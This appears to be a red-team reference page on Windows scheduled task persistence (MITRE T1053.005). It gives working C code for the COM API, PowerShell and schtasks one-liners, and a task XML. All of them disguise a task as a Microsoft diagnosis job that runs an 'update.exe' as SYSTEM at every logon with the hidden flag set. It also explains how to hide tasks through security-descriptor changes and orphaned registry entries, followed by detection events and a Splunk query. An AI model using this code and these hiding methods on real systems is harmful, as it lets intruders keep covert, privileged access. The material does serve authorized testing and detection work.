# Scheduled Task Creation - Code Implementations

MITRE ATT&CK: T1053.005 - Scheduled Task/Job: Scheduled Task

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

The Windows Task Scheduler provides a built-in mechanism for deferred and recurring execution. From an adversary perspective, scheduled tasks offer time-based triggers, SYSTEM-level execution, and survival across reboots. This file covers the COM API approach (preferred for OPSEC), XML task definitions, and techniques for hiding tasks from enumeration.

See also: [Scheduled Tasks (Narrative)](../../04-persistence/scheduled-tasks.md)

## Task Scheduler Architecture

```
                          +---------------------+
                          | Task Scheduler       |
                          | Service (Schedule)   |
                          | svchost.exe -k       |
                          |   netsvcs            |
                          +----------+----------+
                                     |
                      +--------------+--------------+
                      |                             |
               +------+------+             +-------+-------+
               | COM API     |             | schtasks.exe  |
               | ITaskService|             | (CLI wrapper) |
               | interface   |             | shells out to |
               |             |             | COM internally|
               +------+------+             +-------+-------+
                      |                             |
                      v                             v
               +------+----------------------------+-------+
               |  Task Definitions stored as XML files     |
               |  C:\Windows\System32\Tasks\<TaskName>     |
               |  + Registry metadata under                |
               |  HKLM\SOFTWARE\Microsoft\Windows NT\      |
               |     CurrentVersion\Schedule\TaskCache      |
               +-------------------------------------------+
```

**Key insight for OPSEC:** Both `schtasks.exe` and the COM API ultimately go through the same RPC interface to the Task Scheduler service. However, `schtasks.exe` creates a process with a suspicious command line, while COM API calls originate from your process directly with no child process artifacts.

## C Implementation: COM-Based Task Creation

```c
/*
 * schtask_com.c
 * Creates a scheduled task using the ITaskService COM interface.
 * This avoids spawning schtasks.exe and its associated command-line logging.
 *
 * COM object chain:
 *   CoCreateInstance(CLSID_TaskScheduler) -> ITaskService
 *   ITaskService->Connect() -> ITaskService->GetFolder() -> ITaskFolder
 *   ITaskService->NewTask() -> ITaskDefinition
 *   Configure ITaskDefinition (triggers, actions, principal, settings)
 *   ITaskFolder->RegisterTaskDefinition() -> IRegisteredTask
 *
 * DETECTION ARTIFACTS:
 *   - Security Event 4698 (A scheduled task was created) -- fires regardless
 *     of whether COM or schtasks.exe was used. This is the PRIMARY detection.
 *   - Sysmon Event 11 (FileCreate) for the XML file in C:\Windows\System32\Tasks\
 *   - Microsoft-Windows-TaskScheduler/Operational log Event 106 (task registered)
 *   - Registry entries under TaskCache\Tree and TaskCache\Tasks
 *   - NO child process creation (unlike schtasks.exe approach)
 *
 * OPSEC ADVANTAGES OVER schtasks.exe:
 *   - No "schtasks.exe /create" in command-line logging (Event 4688, Sysmon 1)
 *   - No suspicious parent-child relationship
 *   - More control over task XML (can set hidden attribute, custom SDs)
 *
 * Compile: cl.exe /W4 /Fe:schtask.exe schtask_com.c ole32.lib oleaut32.lib
 *          (requires taskschd.h from Windows SDK)
 */

#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <stdio.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

int CreateScheduledTask(void) {
    HRESULT hr;
    ITaskService *pService = NULL;
    ITaskFolder *pRootFolder = NULL;
    ITaskDefinition *pTask = NULL;
    IRegistrationInfo *pRegInfo = NULL;
    ITriggerCollection *pTriggerCollection = NULL;
    ITrigger *pTrigger = NULL;
    ILogonTrigger *pLogonTrigger = NULL;
    IActionCollection *pActionCollection = NULL;
    IAction *pAction = NULL;
    IExecAction *pExecAction = NULL;
    IPrincipal *pPrincipal = NULL;
    ITaskSettings *pSettings = NULL;
    IRegisteredTask *pRegisteredTask = NULL;

    /* Initialize COM -- required before any COM operations */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return -1;

    /* STEP 1: Create ITaskService instance
     * DETECTION: CoCreateInstance for CLSID_TaskScheduler is not inherently
     * suspicious -- many legitimate applications use Task Scheduler COM.
     * ETW COM providers may log this if verbose tracing is enabled. */
    hr = CoCreateInstance(
        &CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_ITaskService,
        (void**)&pService
    );
    if (FAILED(hr)) goto cleanup;

    /* STEP 2: Connect to the local Task Scheduler service.
     * All VARIANT parameters are VT_EMPTY for local connection. */
    VARIANT vEmpty;
    VariantInit(&vEmpty);
    vEmpty.vt = VT_EMPTY;
    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr)) goto cleanup;

    /* STEP 3: Get the root task folder (\)
     * OPSEC: Tasks in the root folder are more visible. Consider creating
     * in a subfolder like \Microsoft\Windows\<something> to blend in with
     * built-in Windows tasks. */
    BSTR bstrRoot = SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, bstrRoot, &pRootFolder);
    SysFreeString(bstrRoot);
    if (FAILED(hr)) goto cleanup;

    /* STEP 4: Create a new task definition */
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) goto cleanup;

    /* STEP 5: Set registration info (description, author)
     * OPSEC: Use a description and author that match legitimate Microsoft
     * tasks. Example: "Microsoft Corporation", "Configuration update task" */
    hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    if (SUCCEEDED(hr)) {
        BSTR bstrAuthor = SysAllocString(L"Microsoft Corporation");
        pRegInfo->lpVtbl->put_Author(pRegInfo, bstrAuthor);
        SysFreeString(bstrAuthor);
        BSTR bstrDesc = SysAllocString(L"Verifies system configuration integrity");
        pRegInfo->lpVtbl->put_Description(pRegInfo, bstrDesc);
        SysFreeString(bstrDesc);
        pRegInfo->lpVtbl->Release(pRegInfo);
    }

    /* STEP 6: Configure the trigger -- logon trigger example.
     * Other trigger types: TASK_TRIGGER_TIME, TASK_TRIGGER_BOOT,
     * TASK_TRIGGER_IDLE, TASK_TRIGGER_EVENT (event log trigger) */
    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
    if (SUCCEEDED(hr)) {
        hr = pTriggerCollection->lpVtbl->Create(
            pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr)) {
            hr = pTrigger->lpVtbl->QueryInterface(
                pTrigger, &IID_ILogonTrigger, (void**)&pLogonTrigger);
            if (SUCCEEDED(hr)) {
                /* OPSEC: Setting a specific UserId limits the trigger to
                 * one user. Omitting it triggers on ANY user logon. */
                BSTR bstrTrigId = SysAllocString(L"LogonTriggerId");
                pLogonTrigger->lpVtbl->put_Id(pLogonTrigger, bstrTrigId);
                SysFreeString(bstrTrigId);
                pLogonTrigger->lpVtbl->Release(pLogonTrigger);
            }
            pTrigger->lpVtbl->Release(pTrigger);
        }
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
    }

    /* STEP 7: Configure the action -- execute a binary */
    hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    if (SUCCEEDED(hr)) {
        hr = pActionCollection->lpVtbl->Create(
            pActionCollection, TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            hr = pAction->lpVtbl->QueryInterface(
                pAction, &IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                /* DETECTION: The executable path appears in Event 4698 XML
                 * and in the task XML file on disk. Use a path that looks
                 * legitimate. */
                BSTR bstrExe = SysAllocString(L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\update.exe");
                pExecAction->lpVtbl->put_Path(pExecAction, bstrExe);
                SysFreeString(bstrExe);
                pExecAction->lpVtbl->Release(pExecAction);
            }
            pAction->lpVtbl->Release(pAction);
        }
        pActionCollection->lpVtbl->Release(pActionCollection);
    }

    /* STEP 8: Set principal -- run with highest privileges */
    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_HIGHEST);
        pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_SERVICE_ACCOUNT);
        pPrincipal->lpVtbl->Release(pPrincipal);
    }

    /* STEP 9: Configure settings */
    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->lpVtbl->put_Enabled(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_Hidden(pSettings, VARIANT_TRUE);  /* Hide from casual listing */
        pSettings->lpVtbl->put_StartWhenAvailable(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->Release(pSettings);
    }

    /* STEP 10: Register the task
     * DETECTION: THIS is the call that triggers Event 4698 in the Security log.
     * There is no way to avoid 4698 when using legitimate APIs.
     * The TASK_CREATE flag creates new; TASK_CREATE_OR_UPDATE updates existing. */
    BSTR bstrTaskName = SysAllocString(L"\\Microsoft\\Windows\\Diagnosis\\Scheduled");
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(
        pRootFolder,
        bstrTaskName,
        pTask,
        TASK_CREATE_OR_UPDATE,
        vEmpty,             /* userId -- empty for current */
        vEmpty,             /* password */
        TASK_LOGON_INTERACTIVE_TOKEN,
        vEmpty,             /* sddl -- empty for default */
        &pRegisteredTask
    );
    SysFreeString(bstrTaskName);

    if (SUCCEEDED(hr)) {
        printf("[+] Task created successfully.\n");
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
    }

cleanup:
    if (pTask) pTask->lpVtbl->Release(pTask);
    if (pRootFolder) pRootFolder->lpVtbl->Release(pRootFolder);
    if (pService) pService->lpVtbl->Release(pService);
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : -1;
}
```

## Hiding Tasks: Security Descriptor Manipulation

```
The Task Scheduler stores a Security Descriptor (SD) for each task. By modifying
the SD after creation, you can prevent standard users (and even some admin tools)
from listing the task.

Default SD (allows Administrators and SYSTEM full access, Authenticated Users read):
  D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)

Restrictive SD (only SYSTEM can access):
  D:P(A;;FA;;;SY)

Registry path for task SD:
  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<TaskPath>
  Value: SD (REG_BINARY)

OPSEC NOTES:
  - schtasks /query runs as the calling user; if the user lacks READ on the task SD,
    the task is invisible in the listing.
  - PowerShell Get-ScheduledTask also respects the SD.
  - However, the XML file still exists on disk in C:\Windows\System32\Tasks\.
  - A forensic examiner with SYSTEM access will still find the task.
  - Deleting the registry tree entry under TaskCache\Tree while leaving
    TaskCache\Tasks intact creates an "orphaned" task that may still execute
    but does not appear in tree enumeration.
```

## PowerShell One-Liner Alternatives

```powershell
# Basic task creation -- VERY visible in script block logging
# DETECTION: PowerShell ScriptBlock Logging (Event 4104), Module Logging,
#            Transcription, plus Security Event 4698
Register-ScheduledTask -TaskName "SystemConfigCheck" `
    -Trigger (New-ScheduledTaskTrigger -AtLogon) `
    -Action (New-ScheduledTaskAction -Execute "C:\Windows\Temp\update.exe") `
    -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest) `
    -Description "Verifies system configuration integrity" `
    -Settings (New-ScheduledTaskSettingsSet -Hidden)

# Using schtasks.exe -- creates process with logged command line
# DETECTION: Event 4688/Sysmon 1 captures the full command line including
# the executable path, making this trivially detectable
schtasks.exe /create /tn "\Microsoft\Windows\Diagnosis\Scheduled" /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM /rl HIGHEST /f
```

## XML Task Definition Structure

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!--
  Task XML files are stored at C:\Windows\System32\Tasks\<name>
  DETECTION: Sysmon Event 11 (FileCreate) triggers when this file is written.
  The XML content reveals the full task configuration including:
    - Command/Arguments (the payload)
    - Triggers (when it runs)
    - Principal (what identity it runs as)
    - Settings (Hidden flag, AllowStartIfOnBatteries, etc.)
-->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Verifies system configuration integrity</Description>
    <URI>\Microsoft\Windows\Diagnosis\Scheduled</URI>
  </RegistrationInfo>
  <Triggers>
    <!-- Trigger types: LogonTrigger, BootTrigger, TimeTrigger,
         CalendarTrigger, IdleTrigger, EventTrigger, SessionStateChangeTrigger -->
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>  <!-- SYSTEM -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\config\systemprofile\AppData\update.exe</Command>
    </Exec>
  </Actions>
</Task>
```

## Detection Indicators

### Security Event 4698 - Scheduled Task Created

This event fires regardless of creation method (COM, schtasks.exe, PowerShell). It includes the full task XML in the `TaskContent` field. This is the **most reliable** detection for scheduled task persistence.

```
Event ID: 4698
Source:   Microsoft-Windows-Security-Auditing
Fields:
  SubjectUserName:  operator
  SubjectDomainName: WORKSTATION
  TaskName:          \Microsoft\Windows\Diagnosis\Scheduled
  TaskContent:       <Task>...</Task>  (full XML)
```

### Microsoft-Windows-TaskScheduler/Operational Log

```
Event 106: Task registered    (task creation)
Event 140: Task updated       (task modification)
Event 141: Task deleted        (cleanup)
Event 200: Action started      (execution)
Event 201: Action completed    (execution finished)
```

### Sysmon Event 11 - FileCreate

```
TargetFilename: C:\Windows\System32\Tasks\Microsoft\Windows\Diagnosis\Scheduled
Image:          C:\Windows\System32\svchost.exe  (Task Scheduler service)
```

### Detection Query (Splunk SPL)

```
index=wineventlog EventCode=4698
| spath input=TaskContent output=Command path=Task.Actions.Exec.Command
| where NOT match(Command, "(?i)^C:\\\\Windows\\\\System32\\\\(taskhostw|cleanmgr|defrag)")
| table _time, SubjectUserName, TaskName, Command
```

## Cross-References

- [Scheduled Tasks (Narrative)](../../04-persistence/scheduled-tasks.md)
- [Registry Persistence (Code)](registry-persistence-code.md) -- lower-privilege alternative
- [WMI Event Subscriptions (Code)](wmi-event-subscription.md) -- event-driven alternative
- [Detection Engineering](../../12-detection-engineering/)
